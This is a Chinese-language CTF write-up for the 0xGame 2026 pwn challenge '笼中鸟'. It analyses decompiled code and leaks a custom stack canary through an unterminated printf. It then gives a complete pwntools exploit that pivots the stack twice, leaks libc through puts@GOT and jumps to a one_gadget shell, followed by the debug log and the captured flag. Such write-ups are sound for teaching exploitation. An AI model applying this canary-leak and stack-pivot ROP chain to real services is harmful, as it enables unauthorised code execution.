# 笼中鸟

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/1 $ nc nc1.ctfplus.cn 41919
hacker , do you know what is canary ?
Tell me what's your name?
scetayh
Hello , nice to meet you. scetayh
This time , I won't give you the backdoor.
 What can you do ?
nothing
Congratulations!
```

看看 IDA ：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+8h] [rbp-18h] BYREF
  __int64 v5; // [rsp+10h] [rbp-10h]
  unsigned int seed[2]; // [rsp+18h] [rbp-8h]

  *(_QWORD *)seed = time(timer: nullptr);
  srand(seed: seed[0]);
  v5 = rand();
  v4 = 0;
  init(a1: &v4, a2: v5);
  vuln();
  return 0;
}
```

```c
__int64 __fastcall init(__int64 a1, __int64 a2)
{
  setvbuf(stream: stdin, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stderr, buf: nullptr, modes: 2, n: 0);
  global_canary = a1 ^ a2;
  return a1 ^ a2;
}
```

伪代码显示构造了一个随机 canary 。

`vuln` ：

```c
int vuln()
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = global_canary;
  memset(s, c: 0, n: sizeof(s));
  puts(s: "hacker , do you know what is canary ?");
  puts(s: "Tell me what's your name?");
  read(fd: 0, buf: s, nbytes: 0x28u);           // 0x28 = 40 bytes
  printf(format: "Hello , nice to meet you. %s", s);
  puts(s: "This time , I won't give you the backdoor.\n What can you do ?");
  read(fd: 0, buf: s, nbytes: 0x40u);           // 0x40 = 64 bytes
  if ( v2 != global_canary )
  {
    puts(s: "All , you don't know what is canary.");
    puts(s: "YOU FAIL!!!");
    exit(status: -1);
  }
  return puts(s: "Congratulations!");
}
```

Stack 大概是：

- saved RBP
- `v2` (8 bytes)
- `s` (0x28 = 40 bytes)

它验证 `v2` 是否与 `global_canary` 相同，阻碍攻击者使用栈溢出。利用这两句：

```c
  read(fd: 0, buf: s, nbytes: 0x28u);           // 0x28 = 40 bytes
  printf(format: "Hello , nice to meet you. %s", s);
```

由于 `read` 不会在字符串末尾补 `\0` ，如果将 40 bytes 末尾填充为 `A` ，`printf` 就有可能越过 40 bytes 读到 `v2` canary ，从而泄露 canary 内容。

如果覆盖多了就会……

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/1 $ nc nc1.ctfplus.cn 41919
hacker , do you know what is canary ?
Tell me what's your name?
ScetayhChan's_Edenic_Territory_Arouses_Yearning_Hearts
Hello , nice to meet you. ScetayhChan's_Edenic_Territory_Arouses_Y�Fג�This time , I won't give you the backdoor.
 What can you do ?
Congratulations!
```

所以必须发送 40 bytes 。接下来第二次 `read` ：

```c
  read(fd: 0, buf: s, nbytes: 0x40u);           // 0x40 = 64 bytes
```

只要保证第 41 至 48 字节仍然写原来的 canary ，canary 检查就会通过。但是接下来并不能够直接布置 ROP ，因为无论是 0x28 还是 0x40 的空间都还是太小了。这里要考虑往 vmmap 的 RW 区域布置，然后将 stack 迁移到那里。用 `pwndbg` 看一下：

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/scetayh/pwn
          0x401000           0x402000 r-xp     1000   1000 /home/scetayh/pwn
          0x402000           0x403000 r--p     1000   2000 /home/scetayh/pwn
          0x403000           0x404000 r--p     1000   2000 /home/scetayh/pwn
          0x404000           0x405000 rw-p     1000   3000 /home/scetayh/pwn
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7db1000 r-xp   189000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db1000     0x7ffff7e00000 r--p    4f000 1b1000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e00000     0x7ffff7e04000 r--p     4000 1ff000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e04000     0x7ffff7e06000 rw-p     2000 203000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e06000     0x7ffff7e13000 rw-p     d000      0 [anon_7ffff7e06]
    0x7ffff7faf000     0x7ffff7fb2000 rw-p     3000      0 [anon_7ffff7faf]
    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000      0 [anon_7ffff7fbd]
    0x7ffff7fbf000     0x7ffff7fc3000 r--p     4000      0 [vvar]
    0x7ffff7fc3000     0x7ffff7fc5000 r-xp     2000      0 [vdso]
    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc6000     0x7ffff7ff1000 r-xp    2b000   1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

这里：

```
          0x404000           0x405000 rw-p     1000   3000 /home/scetayh/pwn
```

编写脚本：

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 41919)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

s_buf_siz = 40
canary_siz = 8
total_siz = s_buf_siz + canary_siz

padding = b'A' * s_buf_siz

vmmap_rw_1 = 0x404800
vmmap_rw_2 = 0x404700
vmmap_rw_3 = 0x404600

pop_rdi = 0x40123e
leave = 0x4013af
retn = pop_rdi + 1
vuln_midentry = 0x401351 # including read 0x40, canary check, congrat printed if former idempotently overwritten, and epilogue
execve_binsh_offset = 0xebc81

congrat = b"Congratulations!\n"

io.sendafter(b"Tell me what's your name?\n", padding)
io.recvuntil(padding)
canary = u64(io.recv(6) + b"\x00\x00")

io.sendafter(
    b" What can you do ?\n",
    # 'read' to override...
    flat(
        padding,        # ...s[]
        canary,         # ...v2 (canary)
        vmmap_rw_1,     # ...saved RBP of 'vuln'
        vuln_midentry,  # ...saved RIP of 'vuln'
    )
)

# canary checked
io.sendafter(
    # congrat printed
    congrat,
    # 'vuln' epilogue, stack pivoted to overridden RBP = vmmap_rw_1 and retn to 'vuln' midentry
    # 'read' to override [vmmap_rw_1 - total_siz]...
    flat(
        vmmap_rw_2,                 # ...vmmap_rw_1 - 48
        pop_rdi, elf.got["puts"],   # ...vmmap_rw_1 - 40
        elf.plt["puts"],            # ...vmmap_rw_1 - 24
        vuln_midentry,              # ...vmmap_rw_1 - 16
        canary,                     # ...vmmap_rw_1 - 8 (canary)
        vmmap_rw_1 - total_siz,     # ...vmmap_rw_1 (saved RBP)
        leave                       # ...vmmap_rw_1 + 8 (saved RIP)
    )
)

# canary checked, congrat printed
io.recvuntil(congrat)
# 'vuln' epilogue, stack pivoted to overridden RBP = vmmap_rw_1 - total_siz and retn to 'leave'
# 'leave' (actually `leave \n retn`) , stack pivoted to overridden RBP = vmmap_rw_2 and retn to RIP (pop_rdi), ROP chain started
# 'puts@plt(puts@got)'
libc.address = u64(io.recv(6) + b'\x00\x00') - libc.sym.puts

# 'vuln_midentry'
io.send(flat(
    vmmap_rw_3,
    libc.address + execve_binsh_offset,
    b'A' * 0x18,
    canary,
    vmmap_rw_2 - total_siz,
    leave
))

# canary checked
io.sendlineafter(
    # congrat printed
    congrat,
    # 'vuln' epilogue, stack pivoted to overridden RBP = vmmap_rw_2 - total_siz and retn to 'leave'
    # 'leave', stack pivoted to overridden RBP = vmmap_rw_3 and retn to RIP (libc.address + execve_binsh_offset), ROP chain started
    # shell gotten
    b"cat flag"
)
print(io.recvuntil(b"\n", drop=True).decode())

io.close()
```

这里面一次 pivot 用于迁移栈，一次 pivot 负责准备执行伪造栈帧上的 ROP ，两个 pivot 构成一组实现具体功能的迁移。因此每次 payload 都被分成两截，第一次小迁移后执行 payload 后半截，第二次反之。

运行：

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/1 $ python3 solve.py 
[+] Opening connection to nc1.ctfplus.cn on port 41919: Done
[*] '/home/scetayh/Projects/0xgame2026-writeups/week2/pwn/1/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/scetayh/Projects/0xgame2026-writeups/week2/pwn/1/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[DEBUG] Received 0x40 bytes:
    b'hacker , do you know what is canary ?\n'
    b"Tell me what's your name?\n"
[DEBUG] Sent 0x28 bytes:
    b'A' * 0x28
[DEBUG] Received 0x48 bytes:
    00000000  48 65 6c 6c  6f 20 2c 20  6e 69 63 65  20 74 6f 20  │Hell│o , │nice│ to │
    00000010  6d 65 65 74  20 79 6f 75  2e 20 41 41  41 41 41 41  │meet│ you│. AA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 eb 88  44 03 fe 7f                            │AA··│D···│
    00000048
[DEBUG] Received 0x3e bytes:
    b"This time , I won't give you the backdoor.\n"
    b' What can you do ?\n'
[DEBUG] Sent 0x40 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  eb 88 44 03  fe 7f 00 00  │AAAA│AAAA│··D·│····│
    00000030  00 48 40 00  00 00 00 00  51 13 40 00  00 00 00 00  │·H@·│····│Q·@·│····│
    00000040
[DEBUG] Received 0x11 bytes:
    b'Congratulations!\n'
[DEBUG] Sent 0x40 bytes:
    00000000  00 47 40 00  00 00 00 00  3e 12 40 00  00 00 00 00  │·G@·│····│>·@·│····│
    00000010  18 40 40 00  00 00 00 00  c4 10 40 00  00 00 00 00  │·@@·│····│··@·│····│
    00000020  51 13 40 00  00 00 00 00  eb 88 44 03  fe 7f 00 00  │Q·@·│····│··D·│····│
    00000030  d0 47 40 00  00 00 00 00  af 13 40 00  00 00 00 00  │·G@·│····│··@·│····│
    00000040
[DEBUG] Received 0x18 bytes:
    00000000  43 6f 6e 67  72 61 74 75  6c 61 74 69  6f 6e 73 21  │Cong│ratu│lati│ons!│
    00000010  0a 50 9e ec  a9 91 7f 0a                            │·P··│····│
    00000018
[DEBUG] Sent 0x40 bytes:
    00000000  00 46 40 00  00 00 00 00  81 4c f3 a9  91 7f 00 00  │·F@·│····│·L··│····│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  eb 88 44 03  fe 7f 00 00  │AAAA│AAAA│··D·│····│
    00000030  d0 46 40 00  00 00 00 00  af 13 40 00  00 00 00 00  │·F@·│····│··@·│····│
    00000040
[DEBUG] Received 0x11 bytes:
    b'Congratulations!\n'
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'0xGame{8fb3206e-dd85-4c19-9c1e-ec779d3bf6b8}\n'
0xGame{8fb3206e-dd85-4c19-9c1e-ec779d3bf6b8}
[*] Closed connection to nc1.ctfplus.cn port 41919
```

得到 flag 为 `0xGame{8fb3206e-dd85-4c19-9c1e-ec779d3bf6b8}` 。